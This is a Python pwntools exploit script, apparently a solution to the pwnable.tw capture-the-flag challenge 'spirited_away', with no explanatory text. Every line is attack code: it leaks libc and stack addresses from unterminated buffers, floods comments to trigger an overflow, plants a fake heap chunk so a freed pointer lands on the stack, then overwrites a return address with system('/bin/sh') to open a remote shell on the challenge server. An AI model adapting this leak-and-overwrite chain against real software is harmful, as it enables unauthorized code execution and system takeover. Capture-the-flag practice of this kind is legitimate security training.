from pwn import *
#p = process("./spirited_away")
p = remote("chall.pwnable.tw" ,10204)
pause()
elf = ELF("./spirited_away")
libc = ELF("./libc_32.so.6")
def spirit(name, age, came, comment):
    p.sendlineafter(": ", name)
    sleep(0.1)
    p.sendlineafter("age:", str(age))
    sleep(0.1)
    p.sendlineafter("movie?", came)
    sleep(0.1)
    p.sendlineafter("comment:", comment)

spirit("a" * 1, 1, "b" * 4, "c" * 1)
p.recvuntil("Reason: bbbb")
libc_leak = u32(p.recv(4))
libc_base = libc_leak - 0x0a - 0x1b0000
p.info("libc_base : "+ hex(libc_base))
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search("/bin/sh"))[0]
p.info("__libc_system : " + hex(system))
p.info("/bin/sh : " + hex(binsh))
p.recvuntil("can")
p.recvuntil("Would you like to leave another comment? <y/n>: ")
p.sendline("y")

spirit("a", 2, "b" * 79, "c")
p.recvuntil("Reason: " + "b"*79+ "\n")
stack_leak = u32(p.recv(4))
p.info("stack_leak : " + hex(stack_leak))
v7 = stack_leak - 0x70
ebp = v7  +0x50
buf_pointer = ebp - 0x54
s = ebp - 0xa8
fake_chunk = ebp
p.info("ebp : " + hex(ebp))
p.info("v7 : " + hex(v7))
p.info("buf : " + hex(buf_pointer))
p.info("s : " + hex(s))
p.sendline("y")
for i in range(0, 111):
    spirit("1", str(i), "1", "1")
    sleep(0.1)
    p.sendafter(":", "y")

payload = p32(0) + p32(0x41) + "a" * 60 + p32(0x10000)
payload2 = "a" * 84 + p32(buf_pointer + 12)
p.sendline("asdf")
sleep(0.1)
p.send(payload)
sleep(0.1)
p.send(payload2)
sleep(0.1)
p.sendline("y")
sleep(0.1)
payload = "a" * 76 + p32(system) + "bbbb" + p32(binsh)
p.send(payload)
p.sendline("1")
p.sendline("2")
p.interactive()
